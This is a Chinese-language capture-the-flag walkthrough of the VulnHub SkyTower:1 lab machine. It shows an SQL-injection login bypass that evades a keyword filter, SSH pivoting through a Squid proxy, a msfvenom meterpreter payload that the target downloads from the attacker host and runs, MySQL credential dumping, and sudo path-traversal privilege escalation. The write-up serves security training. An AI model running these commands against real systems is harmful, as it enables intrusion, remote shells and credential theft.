# SkyTower: 1

https://www.vulnhub.com/entry/skytower-1,96/

difficulty: intermediate to advanced

Finish Date：2024-4-15

## IP

192.168.10.163

## Scan

Open Port -> 22,80,3128

```
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.20
```

ssh 暂不能访问，看看 80 web 上有什么，显示的是一个登陆框，输入一个单引号，显示 mysql 错误，存在 sql 注入，但是对 =、or、and 等关键字进行了过滤，根据网站上的提示自动化工具可能不起作用，没有用 sqlmap 进行爆破。使用 https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file 中的 SQL Injection Auth Bypass Payloads ，在 BP 中对 username 和 passwd 进行相同的设置，最终绕过了登陆，得到了如下信息，根据提示是 ssh 用户凭据(输入 '|1# 就可以绕过)：

```
Username: john
Password: hereisjohn
```

但是尝试登陆 ssh 时，发现不能登陆，nmap 扫描到 22 端口 filtered 状态；另一个开放的端口就是 squid 的 3128，搜索相关资料了解到，squid 能够充当网关进行转发，那么能不能这个 22 端口需要通过 squid 进行端口转发才能访问，使用 proxychains 进行转发。

proxytunnel 也 OK ：

```
proxytunnel -p 192.168.10.163:3128 -d 127.0.0.1:22 -a 5555
ssh sara@127.0.0.1 -p 5555 "pwd"
```

在 /etc/proxychains4.conf 中最后添加：http 192.168.10.163 3128，然后进行登陆：proxychains4 ssh john@192.168.10.163 输入密码后，发现连接又被断开了，应该系统进行了某些设置。

想起来 ssh 在进行连接时，连接命令中可以直接跟系统的操作命令，让我们进行尝试 proxychains4 ssh john@192.168.10.163 'pwd' 执行后，打印了当前路径 /home/john，那么我们就可以执行 shell 反弹命令，连接到我们的 kali 上：

kali 上执行：

```
nc -lvnp 8888

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.3 LPORT=8888 -f elf -o re.elf
python3 -m http.server 7070
```

连接目标机器的命令为：

```
proxychains4 ssh john@192.168.10.163 'wget http://192.168.10.3:7070/re.elf&&chmod +x ./re.elf&&./re.elf'
```

最终，在我们的 kali 上得到了 meterpreter。

先看看为什么用户登陆进去后，就被断开？查看 home 目录下，看到有.bashrc 文件，查看其内容，这里发现了退出的原因（最后三行）：

```
echo
echo  "Funds have been withdrawn"
exit
```

把最后这个 exit 删除，ssh 登陆时就不会退出了：head -n -1 .bashrc > .bashrc

wget 上传 linpeas 进行系统枚举，没找到有用的信息。回想起前面登陆窗口提示的 mysql 错误，去 mysql 数据库中看看有什么有价值的信息，cat /var/www/login.php 找到登陆页面的源代码：

```
$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

同时看到了代码中的过滤字段：
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
```

使用 mysql 命令直接查询数据：

```
mysql --user=root --password=root -e "SELECT * FROM SkyTech.login"

id	email	              password
1	john@skytech.com	  hereisjohn
2	sara@skytech.com	  ihatethisjob
3	william@skytech.com	  senseable
```

这三个用户正好跟/home 中的三个用户名一致 john、sara、william，那么后面的密码很有可能就是 ssh 登陆的密码，尝试登陆 sara、william，还是的用 proxychains + 反弹 shell 命令进行登陆。

sara 登陆后，sudo -l 发现了一些重要的提示：

```
(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

## flag

直接用上面的命令目录穿越：

```
$ sudo /bin/ls /accounts/../root
flag.txt

$ sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```
